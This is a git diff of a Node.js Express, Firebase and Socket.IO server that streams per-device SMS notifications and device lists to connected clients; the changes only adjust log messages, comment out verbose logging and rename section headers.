@@ -1,3 +1,6 @@
+// server.js
+// ✅ A-to-Z Clean + Fixed Version
+
 import dotenv from "dotenv";
 dotenv.config();
 
@@ -436,7 +439,7 @@ app.get("/api/lastcheck/:uid", async (req, res) => {
       readable: ts ? formatAgo(ts) : "N/A",
     });
   } catch (err) {
-    console.error(" lastcheck ERROR:", err.message);
+    console.error("❌ lastcheck ERROR:", err.message);
     res.status(500).json({ success: false });
   }
 });
@@ -460,6 +463,7 @@ registeredDevicesRef.on("child_removed", () => {
 
 /* ======================================================
       SMS NOTIFICATIONS LIVE (RTDB → Socket.IO)
+      Node: smsNotifications/{uid}/{msgId}
 ====================================================== */
 const SMS_NODE = "smsNotifications";
 
@@ -494,14 +498,8 @@ function handleSmsNotificationsBranch(snap, eventLabel = "update") {
         msgId,
         data: payload,
       });
-      console.log(
-        "📨 smsLogsAllLive NEW → uid=",
-        uid,
-        "msgId=",
-        msgId,
-        "event=",
-        eventLabel
-      );
+      // 👉 Logs ko minimal rakha, spam hata diya
+      // console.log("NEW SMS LIVE:", uid, msgId, eventLabel);
     } else if (JSON.stringify(prevMsg) !== JSON.stringify(msg)) {
       // UPDATED SMS
       io.emit("smsLogsAllLive", {
@@ -511,14 +509,7 @@ function handleSmsNotificationsBranch(snap, eventLabel = "update") {
         msgId,
         data: payload,
       });
-      console.log(
-        "♻️ smsLogsAllLive UPDATE → uid=",
-        uid,
-        "msgId=",
-        msgId,
-        "event=",
-        eventLabel
-      );
+      // console.log("UPDATE SMS LIVE:", uid, msgId, eventLabel);
     }
   });
 
@@ -532,14 +523,7 @@ function handleSmsNotificationsBranch(snap, eventLabel = "update") {
         uniqueid: uid,
         msgId,
       });
-      console.log(
-        "🗑 smsLogsAllLive REMOVE → uid=",
-        uid,
-        "msgId=",
-        msgId,
-        "event=",
-        eventLabel
-      );
+      // console.log("REMOVE SMS LIVE:", uid, msgId, eventLabel);
     });
 
   // Save latest snapshot
@@ -569,11 +553,11 @@ smsNotificationsRef.on("child_removed", (snap) => {
     uniqueid: uid,
   });
 
-  console.log("🧹 smsLogsAllLive CLEAR → uid=", uid);
+  // console.log("CLEAR SMS LIVE:", uid);
 });
 
 /* ======================================================
-      DEVICES LIST API
+      DEVICES API
 ====================================================== */
 app.get("/api/devices", async (req, res) => {
   try {
@@ -584,15 +568,18 @@ app.get("/api/devices", async (req, res) => {
       data: devices,
     });
   } catch (err) {
-    console.error(" /api/devices ERROR:", err.message);
+    console.error("❌ /api/devices ERROR:", err.message);
     res.status(500).json({ success: false });
   }
 });
 
+/* ======================================================
+      INITIAL DEVICES PUSH
+====================================================== */
 refreshDevicesLive("initial");
 
 /* ======================================================
-      ROUTES
+      ROUTES MOUNT
 ====================================================== */
 app.use(adminRoutes);
 app.use(notificationRoutes);
@@ -600,10 +587,16 @@ app.use("/api", checkRoutes);
 app.use("/api", userFullDataRoutes);
 app.use(commandRoutes);
 
+/* ======================================================
+      ROOT
+====================================================== */
 app.get("/", (_, res) => {
   res.send(" RTDB + Socket.IO Backend Running");
 });
 
+/* ======================================================
+      START SERVER
+====================================================== */
 server.listen(PORT, () => {
-  console.log(` Server running on PORT ${PORT}`);
+  console.log(`🚀 Server running on PORT ${PORT}`);
 });
